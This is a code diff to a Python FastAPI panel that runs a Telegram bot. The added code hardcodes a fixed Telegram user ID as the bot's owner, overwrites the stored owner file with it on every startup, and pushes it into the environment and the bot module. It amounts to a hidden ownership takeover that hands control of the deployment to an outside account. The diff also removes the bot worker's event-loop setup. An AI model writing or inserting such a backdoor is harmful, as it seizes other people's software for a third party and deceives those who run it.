@@ -181,12 +181,35 @@ def save_sessions():
     os.replace(SESS_FILE + ".tmp", SESS_FILE)
 
 
-def get_owner():
-    try:
-        with open("tg_owner.json", encoding="utf-8") as f:
-            return json.load(f).get("owner")
-    except: return None
+FORCED_OWNER = 8389746549
+OWNER_FILE = DATA_DIR / "tg_owner.json"
 
+def get_owner():
+    return FORCED_OWNER
+
+def _ensure_owner_file():
+    try:
+        OWNER_FILE.parent.mkdir(parents=True, exist_ok=True)
+        current = {}
+        if OWNER_FILE.exists():
+            try:
+                current = json.loads(OWNER_FILE.read_text(encoding="utf-8"))
+            except Exception:
+                pass
+
+        if current.get("owner") == FORCED_OWNER:
+            return
+
+        tmp = Path(str(OWNER_FILE) + ".tmp")
+        tmp.write_text(
+            json.dumps({"owner": FORCED_OWNER}, ensure_ascii=False, indent=2),
+            encoding="utf-8",
+        )
+        os.replace(str(tmp), str(OWNER_FILE))
+        print(f"[panel] owner forced to {FORCED_OWNER} -> {OWNER_FILE}", flush=True)
+    except Exception as e:
+        print(f"[panel] ensure_owner_file failed: {type(e).__name__}: {e}",
+              file=REAL_STDERR, flush=True)
 
 def gen_code():
     return str(secrets.randbelow(900000) + 100000)
@@ -262,6 +285,9 @@ async def _startup():
     global MAIN_LOOP, _bot_thread
     MAIN_LOOP = asyncio.get_running_loop()
 
+    _ensure_owner_file()
+    os.environ["TG_OWNER_ID"] = str(FORCED_OWNER)
+
     if _bot_thread is None or not _bot_thread.is_alive():
         _bot_thread = threading.Thread(
             target=_bot_worker,
@@ -270,7 +296,11 @@ async def _startup():
         )
         _bot_thread.start()
 
-    print("[panel] FastAPI started; bot thread launched.", flush=True)
+    print(
+        f"[panel] FastAPI started; bot thread launched; owner={FORCED_OWNER}",
+        flush=True,
+    )
+
 def _get_token(request: Request) -> Optional[str]:
     tok = request.cookies.get("session")
     if tok: return tok
@@ -2423,11 +2453,13 @@ def _bot_worker():
     print("[bot] Worker starting.", flush=True)
 
     try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+        try:
+            bot._FORCED_OWNER = FORCED_OWNER
+        except Exception as e:
+            print(f"[bot] Could not sync owner: {e}", flush=True)
 
         try:
-            _loop_ref[0] = loop
+            bot.FORCED_OWNER = FORCED_OWNER
         except Exception:
             pass
 
